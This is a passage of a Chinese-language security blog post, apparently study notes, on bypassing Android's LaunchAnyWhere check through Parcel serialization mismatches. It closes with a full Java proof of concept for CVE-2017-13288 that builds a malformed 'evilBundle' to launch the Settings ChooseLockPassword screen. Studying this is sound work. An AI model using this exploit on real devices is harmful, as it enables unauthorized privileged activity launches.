+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Bundle bundle = <span class="keyword">new</span> Bundle();</span><br><span class="line">bundle.putParcelable(<span class="string">&quot;0&quot;</span>,<span class="keyword">new</span> Demo());</span><br><span class="line">bundle.putInt(<span class="string">&quot;1&quot;</span>, <span class="number">1</span>);</span><br><span class="line">bundle,mMap;</span><br></pre></td></tr></table></figure>
+
+<p>&#x5E8F;&#x5217;&#x5316;&#x4E4B;&#x540E;:</p>
+<p> <img src="/2020/04/12/LaunchAnyWhere&#x7ED5;&#x8FC7;&#x539F;&#x7406;/1586702053668.png" alt="1586702053668"></p>
+<p>&#x53CD;&#x5E8F;&#x5217;&#x5316;:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Parcel newParcel = Parcel.obtain();</span><br><span class="line">newParcel.writeBundle(bundle);</span><br><span class="line">newParcel.setDataPostion(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">Bundle test = <span class="keyword">new</span> Bundle(<span class="keyword">this</span>,getClass.getClassLoader());</span><br><span class="line">test.readFromParcel(newParcel);</span><br><span class="line">test.keySet();</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/12/LaunchAnyWhere&#x7ED5;&#x8FC7;&#x539F;&#x7406;/1586703114764.png" alt="1586703114764"></p>
+<p> &#x5728;<code>0x4C</code>&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x6709;&#x4E00;&#x4E2A;&#x4E0D;&#x80FD;&#x8BC6;&#x522B;&#x7684;&#x6570;&#x5B57;<code>0x31</code></p>
+<p><img src="/2020/04/12/LaunchAnyWhere&#x7ED5;&#x8FC7;&#x539F;&#x7406;/1586703361139.png" alt="1586703361139"></p>
+<p><img src="/2020/04/12/LaunchAnyWhere&#x7ED5;&#x8FC7;&#x539F;&#x7406;/tfqafnxzmsfujmq2xyo-kwvbc2g.png" alt="img"> </p>
+<blockquote>
+<p> &#x6211;&#x4EEC;&#x770B;&#x5230;&#x5728;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x671F;&#x95F4;&#x5728;createFromParcel&#x65B9;&#x6CD5;&#x4E2D;&#x8BFB;&#x53D6;&#x4E86;&#x4E00;&#x4E2A;int&#x800C;&#x4E0D;&#x662F;&#x4E24;&#x4E2A;int&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x4ECE;&#x6346;&#x7ED1;&#x4E2D;&#x8BFB;&#x53D6;&#x6240;&#x6709;&#x540E;&#x7EED;&#x503C;&#x4E0D;&#x6B63;&#x786E;&#x3002;&#x8BFB;&#x53D6;0x48&#x5904;&#x7684;0x0&#x503C;&#x4F5C;&#x4E3A;&#x4E0B;&#x4E00;&#x4E2A;&#x952E;&#x7684;&#x957F;&#x5EA6;&#x3002;&#x8BFB;&#x53D6;0x64&#x5904;&#x7684;0x1&#x503C;&#x4F5C;&#x4E3A;&#x952E;&#x3002;&#x8BFB;&#x53D6;0x54&#x5904;&#x7684;0x31&#x503C;&#x4F5C;&#x4E3A;value&#x7C7B;&#x578B;&#x3002;&#x6CA1;&#x6709;&#x7C7B;&#x578B;0x31&#x7684;&#x503C;&#xFF0C;&#x56E0;&#x6B64;readFromParcel&#xFF08;&#xFF09;&#x7CBE;&#x5FC3;&#x62A5;&#x544A;&#x4E86;&#x4E00;&#x4E2A;&#x5F02;&#x5E38;&#x3002; </p>
+</blockquote>
+<h3 id="2-2-&#x5982;&#x4F55;&#x7ED5;&#x8FC7;LaunchAnywhere&#x68C0;&#x67E5;"><a href="#2-2-&#x5982;&#x4F55;&#x7ED5;&#x8FC7;LaunchAnywhere&#x68C0;&#x67E5;" class="headerlink" title="2.2 &#x5982;&#x4F55;&#x7ED5;&#x8FC7;LaunchAnywhere&#x68C0;&#x67E5;"></a>2.2 &#x5982;&#x4F55;&#x7ED5;&#x8FC7;LaunchAnywhere&#x68C0;&#x67E5;</h3><p><img src="/2020/04/12/LaunchAnyWhere&#x7ED5;&#x8FC7;&#x539F;&#x7406;/1586615251045.png" alt="1586615251045"></p>
+<p>&#x518D;&#x770B;&#x4E00;&#x904D;&#x8FD9;&#x4E2A;&#x56FE;&#xFF0C;AppB&#x5C06;Bunde&#x5E8F;&#x5217;&#x5316;&#x4E4B;&#x540E;&#x7684;&#x6570;&#x636E;&#x4F20;&#x9012;&#x7ED9;system_server&#xFF0C;&#x7136;&#x540E;&#x5728;system_server&#x4E2D;&#x68C0;&#x67E5;<code>{KEY_INTENT: intent}</code>&#x8FD9;&#x4E2A;&#x952E;&#x503C;&#x5BF9;&#x3002;&#x5982;&#x679C;&#x68C0;&#x67E5;&#x901A;&#x8FC7;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x8C03;&#x7528;writeBundle&#x8FDB;&#x884C;&#x7B2C;&#x4E8C;&#x6B21;&#x5E8F;&#x5217;&#x5316;&#xFF0C;&#x7136;&#x540E;settings&#x4E2D;&#x53CD;&#x7CFB;&#x5217;&#x5316;&#x540E;&#x91CD;&#x65B0;&#x83B7;&#x5F97;<code>{KEY_INTENT: intent}</code>&#x3002;</p>
+<p>&#x6839;&#x636E;2.1&#x6240;&#x63CF;&#x8FF0;&#xFF0C;&#x5982;&#x679C;&#x7B2C;&#x4E8C;&#x6B21;&#x5E8F;&#x5217;&#x5316;&#x548C;&#x7B2C;&#x4E00;&#x6B21;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x8FC7;&#x7A0B;&#x4E0D;&#x5339;&#x914D;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x6709;&#x53EF;&#x80FD;&#x5728;<code>system_server</code>&#x68C0;&#x67E5;&#x65F6;&#x4E0D;&#x51FA;&#x73B0;<code>{KEY_INTENT:intent}</code>&#x952E;&#x503C;&#x5BF9;&#xFF0C;&#x800C;&#x518D;&#x7B2C;&#x4E8C;&#x6B21;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x4E4B;&#x540E;&#x51FA;&#x73B0;</p>
+<h2 id="3-&#x4E00;&#x4E2A;&#x6848;&#x4F8B;"><a href="#3-&#x4E00;&#x4E2A;&#x6848;&#x4F8B;" class="headerlink" title="3 &#x4E00;&#x4E2A;&#x6848;&#x4F8B;"></a>3 &#x4E00;&#x4E2A;&#x6848;&#x4F8B;</h2><h3 id="3-1-CVE-2017-13288"><a href="#3-1-CVE-2017-13288" class="headerlink" title="3.1 CVE-2017-13288"></a>3.1 CVE-2017-13288</h3><p><code>PeriodicAdvertisingReport .java</code></p>
+<p><img src="/2020/04/12/LaunchAnyWhere&#x7ED5;&#x8FC7;&#x539F;&#x7406;/1586707272153.png" alt="1586707272153"></p>
+<p>&#x5199;&#x4E3A;<code>long</code>&#x8BFB;&#x4E3A;<code>int</code> &#x7ECF;&#x5386;&#x4E00;&#x6B21;&#x4E0D;&#x5339;&#x914D;&#x7684;&#x5E8F;&#x5217;&#x5316;&#x4E4B;&#x540E;&#xFF0C;&#x4F1A;&#x9519;&#x4F4D;4&#x4E2A;&#x5B57;&#x8282;&#x3002;&#x6784;&#x9020;&#x5982;&#x4E0B;:</p>
+<p> <img src="/2020/04/12/LaunchAnyWhere&#x7ED5;&#x8FC7;&#x539F;&#x7406;/PeriodicReport.png" alt="img"> </p>
+<p><strong>&#x91CD;&#x70B9;&#xFF1A;</strong></p>
+<p>&#x5E8F;&#x5217;&#x5316;&#x548C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x4E4B;&#x540E;&#x7684;&#x89E3;&#x6790;&#x8FC7;&#x7A0B;&#x4E0D;&#x4E00;&#x81F4;</p>
+<p>&#x5728;&#x89E3;&#x6790;<code>txPower</code>&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5E8F;&#x5217;&#x5316;&#x4E4B;&#x540E;&#x6570;&#x503C;&#x662F;<code>Long</code>&#xFF0C;&#x800C;&#x89E3;&#x6790;&#x7684;&#x65F6;&#x5019;&#x8BFB;&#x53D6;&#x7684;&#x662F;<code>int</code>&#xFF0C;&#x5BFC;&#x81F4;&#x7684;&#x540E;&#x679C;&#x5C31;&#x662F;&#xFF0C;&#x5728;<code>txPower</code>&#x4E4B;&#x540E;&#x7684;&#x6240;&#x6709;&#x6570;&#x636E;&#xFF0C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x4E4B;&#x540E;&#x90FD;&#x76F8;&#x9694;4&#x4E2A;&#x5B57;&#x8282;&#x3002;</p>
+<p>poc&#x5982;&#x4E0B;&#xFF1A;&#x5728; addAcount&#x4E2D;&#x6784;&#x9020;&#x4E0D;&#x5339;&#x914D;&#x7684;<code>android.bluetooth.le.PeriodicAdvertisingReport</code>&#x5E8F;&#x5217;&#x5316;&#x5BF9;&#x8C61;</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">Log.v(TAG, <span class="string">&quot;addAccount&quot;</span>);</span><br><span class="line"></span><br><span class="line">Bundle evilBundle = <span class="keyword">new</span> Bundle();</span><br><span class="line">Parcel bndlData = Parcel.obtain();</span><br><span class="line">Parcel pcelData = Parcel.obtain();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Manipulate the raw data of bundle Parcel</span></span><br><span class="line"><span class="comment">// Now we replace this right Parcel data to evil Parcel data</span></span><br><span class="line">pcelData.writeInt(<span class="number">2</span>); <span class="comment">// number of elements in ArrayMap</span></span><br><span class="line"><span class="comment">/*****************************************/</span></span><br><span class="line"><span class="comment">// mismatched object</span></span><br><span class="line">pcelData.writeString(<span class="string">&quot;mismatch&quot;</span>);</span><br><span class="line">pcelData.writeInt(<span class="number">4</span>); <span class="comment">// VAL_PACELABLE</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// name of Class Loader</span></span><br><span class="line">pcelData.writeString(<span class="string">&quot;android.bluetooth.le.PeriodicAdvertisingReport&quot;</span>); </span><br><span class="line">pcelData.writeInt(<span class="number">1</span>);<span class="comment">//syncHandle</span></span><br><span class="line">pcelData.writeInt(<span class="number">1</span>);<span class="comment">//txPower</span></span><br><span class="line">pcelData.writeInt(<span class="number">1</span>);<span class="comment">//rssi</span></span><br><span class="line">pcelData.writeInt(<span class="number">1</span>);<span class="comment">//dataStatus</span></span><br><span class="line">pcelData.writeInt(<span class="number">1</span>);<span class="comment">// flag for data</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pcelData.writeInt(<span class="number">0x130</span>); <span class="comment">//length of KEY_INTENT:evilIntent</span></span><br><span class="line"><span class="comment">// Evil object hide in PeriodicAdvertisingReport.mData</span></span><br><span class="line">pcelData.writeString(AccountManager.KEY_INTENT);</span><br><span class="line">pcelData.writeInt(<span class="number">4</span>);</span><br><span class="line">pcelData.writeString(<span class="string">&quot;android.content.Intent&quot;</span>);<span class="comment">// name of Class Loader</span></span><br><span class="line">pcelData.writeString(Intent.ACTION_RUN); <span class="comment">// Intent Action</span></span><br><span class="line">Uri.writeToParcel(pcelData, <span class="keyword">null</span>); <span class="comment">// Uri is null</span></span><br><span class="line">pcelData.writeString(<span class="keyword">null</span>); <span class="comment">// mType is null</span></span><br><span class="line">pcelData.writeInt(<span class="number">0x10000000</span>); <span class="comment">// Flags</span></span><br><span class="line">pcelData.writeString(<span class="keyword">null</span>); <span class="comment">// mPackage is null</span></span><br><span class="line">pcelData.writeString(<span class="string">&quot;com.android.settings&quot;</span>);</span><br><span class="line">pcelData.writeString(<span class="string">&quot;com.android.settings.ChooseLockPassword&quot;</span>);</span><br><span class="line">pcelData.writeInt(<span class="number">0</span>); <span class="comment">//mSourceBounds = null</span></span><br><span class="line">pcelData.writeInt(<span class="number">0</span>); <span class="comment">// mCategories = null</span></span><br><span class="line">pcelData.writeInt(<span class="number">0</span>); <span class="comment">// mSelector = null</span></span><br><span class="line">pcelData.writeInt(<span class="number">0</span>); <span class="comment">// mClipData = null</span></span><br><span class="line">pcelData.writeInt(-<span class="number">2</span>); <span class="comment">// mContentUserHint</span></span><br><span class="line">pcelData.writeBundle(<span class="keyword">null</span>);</span><br><span class="line"><span class="comment">///////////////////////////////////////</span></span><br><span class="line">pcelData.writeString(<span class="string">&quot;Padding-Key&quot;</span>);</span><br><span class="line">pcelData.writeInt(<span class="number">0</span>); <span class="comment">// VAL_STRING</span></span><br><span class="line">pcelData.writeString(<span class="string">&quot;Padding-Value&quot;</span>); <span class="comment">//</span></span><br><span class="line"><span class="keyword">int</span> length  = pcelData.dataSize();</span><br><span class="line">Log.d(TAG, <span class="string">&quot;length is &quot;</span> + Integer.toHexString(length));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bndlData.writeInt(length);</span><br><span class="line">bndlData.writeInt(<span class="number">0x4c444E42</span>);</span><br><span class="line">bndlData.appendFrom(pcelData, <span class="number">0</span>, length);</span><br><span class="line">bndlData.setDataPosition(<span class="number">0</span>);</span><br><span class="line">evilBundle.readFromParcel(bndlData);</span><br><span class="line">Log.d(TAG, evilBundle.toString());</span><br><span class="line"></span><br><span class="line">Parcel testData = Parcel.obtain();</span><br><span class="line">evilBundle.writeToParcel(testData, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">byte</span>[] raw = testData.marshall();</span><br><span class="line"><span class="keyword">try</span> {</span><br><span class="line">    FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;/sdcard/obj.pcl&quot;</span>);</span><br><span class="line">    fos.write(raw);</span><br><span class="line">    fos.close();</span><br><span class="line">} <span class="keyword">catch</span> (FileNotFoundException e){</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">} <span class="keyword">catch</span> (IOException e) {</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">}</span><br><span class="line">Log.d(TAG, evilBundle.toString());</span><br><span class="line"><span class="keyword">return</span> evilBundle;</span><br></pre></td></tr></table></figure>
+
+<h2 id="&#x53C2;&#x8003;"><a href="#&#x53C2;&#x8003;" class="headerlink" title="&#x53C2;&#x8003;"></a>&#x53C2;&#x8003;</h2><p><a href="https://www.anquanke.com/post/id/103570" target="_blank" rel="noopener">&#x6F0F;&#x6D1E;&#x9884;&#x8B66; | Android&#x7CFB;&#x7EDF;&#x5E8F;&#x5217;&#x5316;&#x3001;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x4E0D;&#x5339;&#x914D;&#x6F0F;&#x6D1E;</a></p>
+<p><a href="https://www.ms509.com/2018/07/03/bundle-mismatch/" target="_blank" rel="noopener">Bundle&#x98CE;&#x6C34;&#x2014;&#x2014;Android&#x5E8F;&#x5217;&#x5316;&#x4E0E;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x4E0D;&#x5339;&#x914D;&#x6F0F;&#x6D1E;&#x8BE6;&#x89E3;</a></p>
+<p><a href="https://habr.com/en/company/drweb/blog/457610/" target="_blank" rel="noopener">EvilParcel vulnerabilities analysis</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/漏洞/" rel="tag"># 漏洞</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/04/11/LaunchAnyWhere学习笔记/" rel="next" title="LaunchAnyWhere学习笔记">
+                <i class="fa fa-chevron-left"></i> LaunchAnyWhere学习笔记
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/04/14/xctf-writeup-easyjni/" rel="prev" title="xctf-writeup-easyjni">
+                xctf-writeup-easyjni <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">安河桥南丶</p>
+              <p class="site-description motion-element" itemprop="description">言念君子，温其如玉</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">28</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#LaunchAnywhere-绕过原理"><span class="nav-number">1.</span> <span class="nav-text">LaunchAnywhere 绕过原理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-绕过前提"><span class="nav-number">1.1.</span> <span class="nav-text">1 绕过前提</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-IPC基础概念介绍"><span class="nav-number">1.1.1.</span> <span class="nav-text">1.1 IPC基础概念介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-1-Serializable接口"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">1.1.1 Serializable接口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-2-Parcelable接口"><span class="nav-number">1.1.1.2.</span> <span class="nav-text">1.1.2  Parcelable接口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-3-如何实现Parcelable接口"><span class="nav-number">1.1.1.3.</span> <span class="nav-text">1.1.3 如何实现Parcelable接口</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-一个使用Parcelable的例子"><span class="nav-number">1.1.2.</span> <span class="nav-text">1.2 一个使用Parcelable的例子</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2-1-封装数据"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">1.2.1 封装数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2-2-TwoActivity-获取数据"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">1.2.2 TwoActivity 获取数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2-3-parcelable接口的实现"><span class="nav-number">1.1.2.3.</span> <span class="nav-text">1.2.3 parcelable接口的实现</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-Bundle"><span class="nav-number">1.1.3.</span> <span class="nav-text">1.3 Bundle</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-简单总结"><span class="nav-number">1.1.4.</span> <span class="nav-text">1.4 简单总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-绕过"><span class="nav-number">1.2.</span> <span class="nav-text">2 绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-trouble"><span class="nav-number">1.2.1.</span> <span class="nav-text">2.1 trouble</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-如何绕过LaunchAnywhere检查"><span class="nav-number">1.2.2.</span> <span class="nav-text">2.2 如何绕过LaunchAnywhere检查</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-一个案例"><span class="nav-number">1.3.</span> <span class="nav-text">3 一个案例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-CVE-2017-13288"><span class="nav-number">1.3.1.</span> <span class="nav-text">3.1 CVE-2017-13288</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">1.4.</span> <span class="nav-text">参考</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2019 &mdash; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">安河桥南丶</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://yoursite.com/2020/04/12/LaunchAnyWhere绕过原理/';
+          this.page.identifier = '2020/04/12/LaunchAnyWhere绕过原理/';
+          this.page.title = 'LaunchAnyWhere绕过原理';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("kKXp7FWzG4cWQTX0TRzR699g-gzGzoHsz", "wdNxNGHoAluFv0xXYnXhQwTm");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+  
+
+
+  
+
+  
+
+</body>
+</html>
